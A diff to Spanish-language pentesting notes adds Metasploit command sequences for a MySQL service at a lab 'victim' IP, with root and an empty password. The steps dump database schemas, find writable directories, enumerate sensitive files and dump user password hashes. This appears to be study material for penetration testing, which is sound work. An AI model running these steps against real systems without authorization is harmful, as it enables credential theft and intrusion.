@@ -280,16 +280,53 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 ## Puerto 3306 MYSQL 'Reconocimiento'
 
 ```bash 
+# Mostrar las bases de datos 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_schemadump             # Usamos el auxiliar 
+	❯ options
+	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set username root
+	❯ set password ""
+	❯ exploit
+```
+
+```bash 
 # Nos dice que directorios tienen privilegios de escritura 
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/mysql/mysql_writable_dirs        # Usamos el auxiliar 
 	❯ options
-	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
 	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
 	❯ set verbose false
 	❯ advanced                                               # Mirar las opciones avanzadas
+	❯ set username root
 	❯ set password ""
-	❯ run 
+	❯ run
 ```
+
+```bash 
+# Enumeramos los dir sensibles de lectura   
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_file_enum            # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+	❯ set username root
+	❯ set password ""
+	❯ run
+```
+
+```bash 
+# Obtener los hashes de los diferentes usuarios 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_hashdump             # Usamos el auxiliar 
+	❯ options
+	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set username root
+	❯ set password ""
+	❯ exploit
 ```
